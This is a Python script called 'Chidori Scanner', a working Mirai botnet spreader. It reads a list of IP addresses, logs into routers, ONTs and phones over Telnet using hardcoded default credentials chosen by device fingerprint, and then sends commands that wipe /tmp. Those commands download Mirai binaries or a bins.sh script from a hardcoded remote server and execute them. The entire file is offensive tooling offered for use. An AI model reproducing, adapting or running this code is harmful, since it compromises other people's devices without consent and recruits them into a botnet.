#!/usr/bin/python
# Chidori Scanner

import threading
import sys, os, re, time, socket
from Queue import *
from sys import stdout

if len(sys.argv) < 3:
	print "Usage: python "+sys.argv[0]+" <list> <threads>"
	sys.exit()

#SHIT THAT DONT NEED TO BE CHANGED
ips = open(sys.argv[1], "r").readlines()
threads = int(sys.argv[2])
queue = Queue()
queue_count = 0

#CONFIG#
cmd_mips = "cd /tmp; rm -rf *; wget http://23.95.222.166/bins/mirai.mips || tftp -r mirai.mips -g 23.95.222.166 || tftp 23.95.222.166 -g mirai.mips; cat mirai.mips > dvrHelper; chmod +x dvrHelper; ./dvrHelper; rm -rf dvrHelper"
cmd_mipsel = "cd /tmp; rm -rf *; wget http://23.95.222.166/bins/mirai.mpsl || tftp -r mirai.mpsl -g 23.95.222.166 || tftp 23.95.222.166 -g mirai.mpsl; cat mirai.mpsl > dvrHelper; chmod +x dvrHelper; ./dvrHelper; rm -rf dvrHelper"
cmd_arm = "cd /tmp; rm -rf *; wget http://23.95.222.166/bins/mirai.arm7; cat mirai.arm7 > dvrHelper; chmod +x dvrHelper; ./dvrHelper; rm -rf dvrHelper"
bin_sh = "http://23.95.222.166/bins.sh"

#ADDING IPS TO QUEUE#
for ip in ips:
	queue_count += 1
	stdout.write("\r[%d] Added to queue" % queue_count)
	stdout.flush()
	queue.put(ip)
print "\n"

#USER/PASS INFO
combo = ["support:support", "admin:admin", "supervisor:zyad1234", "user:user"] #dont change
usernames = ["root", "admin", "root", "admin"]
passwords = ["oelinux123", "admin", "admin", "skbiptv"]

#HACKIFICATION ACTION#
class router(threading.Thread):
	def __init__ (self, ip):
		threading.Thread.__init__(self)
		self.ip = str(ip).rstrip('\n')
	def run(self):
		end = 0
		while (end == 0):
			try:
				try:
					tn = socket.socket()
					tn.settimeout(8)
					tn.connect((self.ip,23))
				except Exception:
					end = 1
					tn.close()
				username = ""
				password = ""
				for passwd in combo:
					if ":n/a" in passwd:
						password=""
					else:
						password=passwd.split(":")[1]
					if "n/a:" in passwd:
						username=""
					else:
						username=passwd.split(":")[0]
					try:
						hoho = ''
						hoho += readUntil(tn, ":")
						if "BCM" in hoho:
							tn.send(username + "\n")
							time.sleep(0.09)
						elif "6511" in hoho:
							tn.send(username + "\n")
							time.sleep(0.09)
						elif "tangox" in hoho:
							tn.send("default" + "\n")
							time.sleep(0.09)
						elif "VMG" in hoho:
							password = "1234567890"
							tn.send("adminpldt" + "\n")
							time.sleep(0.1)
						elif "mdm9625" in hoho:
							nonr00t = 1
							username = usernames[1]
							password = passwords[1]
							tn.send(username + "\n")
							time.sleep(0.1)
						elif "9615-cdp" in hoho:
							r00t = 1
							username = usernames[0]
							password = passwords[0]
							tn.send(username + "\n")
							time.sleep(0.1)
						elif "Login as:" in hoho:
							ONT = 1
							username = usernames[2]
							password = passwords[2]
							tn.send(username + "\n")
							time.sleep(0.1)
						elif "(none)" in hoho:
							skbiptv = 1
							username = usernames[3]
							password = passwords[3]
							tn.send(username + "\n")
							time.sleep(0.1)
						else:
							tn.send(username + "\n")
							time.sleep(0.1)
					except Exception:
						end = 1
						tn.close()
					try:
						hoho = ''
						hoho += readUntil(tn, "assword:")
						if "assword" in hoho:
							tn.send(password + "\n")
							time.sleep(0.8)
						else:
							pass
					except Exception:
						end = 1
						tn.close()
					try:
						prompt = ''
						prompt += tn.recv(40960)
						if ">" in prompt:
							tn.send("cat | sh" + "\n")
							time.sleep(0.1)
							tn.send("sh" + "\n")
							time.sleep(0.1)
							tn.send(cmd_mips + "\n")
							print "\033[32m[%s] xDSL Command Sent!\033[37m"%(self.ip)
							time.sleep(10)
							tn.close()
							end = 1
						elif "default@" in prompt:
							tn.send(cmd_mipsel + "\n")
							print "\033[36m[%s] TangoX Command Sent!\033[37m"%(self.ip)
							time.sleep(10)
							tn.close()
							end = 1
						elif "Number:" in prompt:
							tn.send("24" + "\n")
							time.sleep(0.5)
							tn.send("8" + "\n")
							time.sleep(0.5)
							tn.send(cmd_mips + "\n")
							print "\033[35m[%s] VMG Command Sent!\033[37m"%(self.ip)
							time.sleep(10)
							tn.close()
							end = 1
						elif r00t: 
							tn.send(cmd_arm + "\n")
							print "\033[33m[%s] Phone Command Sent!\033[37m"%(self.ip)
							time.sleep(10)
							tn.close()
							end = 1
						elif nonr00t:
							tn.send("su" + "\n")
							readUntil(tn, "Password:")
							tn.send(passwords[0] + "\n")
							time.sleep(0.5)
							tn.send(cmd_arm + "\n")
							print "\033[33m[%s] Phone Command Sent!\033[37m"%(self.ip)
							time.sleep(10)
							tn.close()
							end = 1
						elif ONT:
							tn.send("enable" + "\n")
							time.sleep(0.2)
							tn.send("system" + "\n")
							time.sleep(0.2)
							tn.send("shell" + "\n")
							time.sleep(0.2)
							command = "cd /tmp; wget "+bin_sh+"; sh bins.sh; rm -rf bins.sh"
							tn.send(command + "\n")
							print "\033[34m[%s] ONT Command Sent!\033[37m"%(self.ip)
							time.sleep(10)
							tn.close()
							end = 1
						elif skbiptv:
							tn.send(cmd_mips + "\n")
							print "\033[34m[%s] SKBIPTV Command Sent!\033[37m"%(self.ip)
							time.sleep(10)
							tn.close()
							end = 1
						else:
							if "#" in prompt or "$" in prompt:
								tn.send("sh" + "\n")
								time.sleep(0.2)
								tn.send("shell" + "\n")
								time.sleep(0.2)
								tn.send("system shell" + "\n")
								time.sleep(0.2)
								command = "cd /tmp; wget "+bin_sh+"; sh bins.sh; rm -rf bins.sh"
								tn.send(command + "\n")
								print "\033[37m[%s] Command Sent!\033[37m"%(self.ip)
								time.sleep(20)
								tn.close()
								end = 1
							else:
								pass
					except Exception:
						end = 1
						tn.close()
			except:
				pass

#SOCKET READ UNTIL#
def readUntil(tn, string, timeout=10):
	buf = ''
	start_time = time.time()
	while time.time() - start_time < timeout:
		buf += tn.recv(2048)
		time.sleep(0.01)
		if string in buf: return buf
	raise Exception('TIMEOUT!')

#WORKER THREAD#
def worker():
	try:
		while True:
			try:
				iP = queue.get()
				thrd = router(iP)
				thrd.start()
				queue.task_done()
				time.sleep(0.2)
			except:
				pass
	except:
		pass

#STARTING WORKER THREADS#
for l in xrange(threads):
	try:
		t = threading.Thread(target=worker)
		t.start()
		time.sleep(0.009)
	except:
		pass#b4ckdoor